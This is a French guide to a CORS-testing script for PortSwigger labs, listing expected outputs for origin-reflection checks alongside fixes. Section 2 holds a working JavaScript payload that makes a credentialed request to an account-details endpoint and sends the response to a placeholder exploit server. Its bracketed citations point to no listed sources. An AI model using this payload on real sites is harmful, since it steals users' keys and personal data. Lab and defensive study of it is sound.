# MANPAGE

Voici un exemple exhaustif d’utilisation du script CORS pour les challenges PortSwigger, avec analyse des résultats attendus pour chaque fonction, en lien avec les scénarios classiques des labs :

---

## 1. Test des headers CORS avec différentes valeurs Origin

**But** : Vérifier si le serveur accepte des origines arbitraires, null, sous-domaines, ou non sécurisées, et s’il combine `Access-Control-Allow-Credentials: true` avec une origine dangereuse.

**Exécution** :
```bash
./script.sh
```
**Sortie attendue** :
```
[1] Test des headers CORS avec différentes valeurs Origin

Test avec Origin: https://evil.com
access-control-allow-origin: https://evil.com
access-control-allow-credentials: true
>> [ALERTE] L'origine https://evil.com est reflétée dans Access-Control-Allow-Origin !
>> [DANGER] Access-Control-Allow-Credentials: true détecté avec https://evil.com !
>> PROPOSITION : Ne jamais refléter d'origine dangereuse ou arbitraire avec allow-credentials.

Test avec Origin: null
access-control-allow-origin: null
>> [ALERTE] L'origine null est reflétée dans Access-Control-Allow-Origin !
>> PROPOSITION : Ne jamais autoriser l'origine null sauf cas strictement nécessaire.

Test avec Origin: https://subdomain.your-lab.web-security-academy.net
access-control-allow-origin: https://subdomain.your-lab.web-security-academy.net

Test avec Origin: http://trusted-subdomain.your-lab.web-security-academy.net
access-control-allow-origin: http://trusted-subdomain.your-lab.web-security-academy.net
>> [ALERTE] Le serveur accepte un sous-domaine non sécurisé (HTTP) !
>> PROPOSITION : Toujours exiger HTTPS pour les origines de confiance.

Test avec Origin: https://example.com
access-control-allow-origin: https://example.com

Test avec Origin: *
access-control-allow-origin: *
>> [ALERTE] Access-Control-Allow-Origin: * détecté !
>> PROPOSITION : Ne jamais utiliser * avec des endpoints sensibles ou allow-credentials.
```
**Analyse** : Si le serveur reflète n’importe quelle origine ou accepte `null`, ou s’il combine `allow-credentials: true` avec une origine arbitraire, la configuration est vulnérable[1][3][5].

---

## 2. Génération d’une preuve de concept JS pour exploitation CORS (origin reflection)

**But** : Générer un script de vol de données (exfiltration) à placer sur un exploit server PortSwigger.

**Exécution** :  
Le script affiche un code HTML/JS :
```html
<script>
var req = new XMLHttpRequest();
req.onload = function() {
    location = 'https://YOUR-EXPLOIT-SERVER/log?key=' + encodeURIComponent(this.responseText);
};
req.open('GET', 'https://your-lab.web-security-academy.net/accountDetails', true);
req.withCredentials = true;
req.send();
</script>
```
**Test** :
- Placez ce code sur votre exploit server PortSwigger.
- Cliquez sur "View exploit" pour vérifier que l’API key ou des données sensibles sont exfiltrées via les logs de l’exploit server[3][5].

---

## 3. Test de configuration CORS dangereuse avec null ou protocoles mixtes

**But** : Tester si le serveur accepte l’origine `null` (ex : sandbox, fichiers locaux) ou des sous-domaines en HTTP.

**Exécution** :
```
[3] Test de configuration CORS avec Origin: null et protocoles mixtes
Origin: null
access-control-allow-origin: null
>> [ALERTE] Le serveur accepte l'origine null !
>> PROPOSITION : Ne jamais autoriser l'origine null sauf cas strictement nécessaire.

Origin: http://trusted-subdomain.your-lab.web-security-academy.net
access-control-allow-origin: http://trusted-subdomain.your-lab.web-security-academy.net
>> [ALERTE] Le serveur accepte un sous-domaine non sécurisé (HTTP) !
>> PROPOSITION : Toujours exiger HTTPS pour les origines de confiance.
```
**Analyse** : Si le serveur accepte `null` ou un sous-domaine en HTTP, la configuration est vulnérable à certains scénarios d’attaque avancés[1][3][5].

---

## 4. Conseils avancés et Burp Suite

**But** : Automatiser et approfondir la détection de mauvaises configurations CORS.

**Exécution** :
```
[4] Conseils avancés et automatisation avec Burp Suite
- Utilisez l'extension Burp 'CORS* - Additional CORS Checks' pour automatiser la détection de mauvaises configurations.
- L'extension teste la réflexion d'origines arbitraires, null, sous-domaines, protocoles mixtes, etc.
- Documentation : https://portswigger.net/web-security/cors
- Extension : https://github.com/PortSwigger/additional-cors-checks
```
**Analyse** : Utilisez Burp Suite et son extension pour une couverture complète et automatisée des scénarios CORS[7].

---

## Synthèse finale

**Sortie** :
```
------------------------------------------------------
[SYNTHÈSE]
1. Vérifiez si des origines arbitraires, null ou non sécurisées sont acceptées dans Access-Control-Allow-Origin.
2. Testez l'exfiltration de données sensibles via la PoC JS générée.
3. Utilisez Burp Suite et son extension CORS* pour une couverture complète.
Documentation PortSwigger : https://portswigger.net/web-security/cors
------------------------------------------------------
```

---
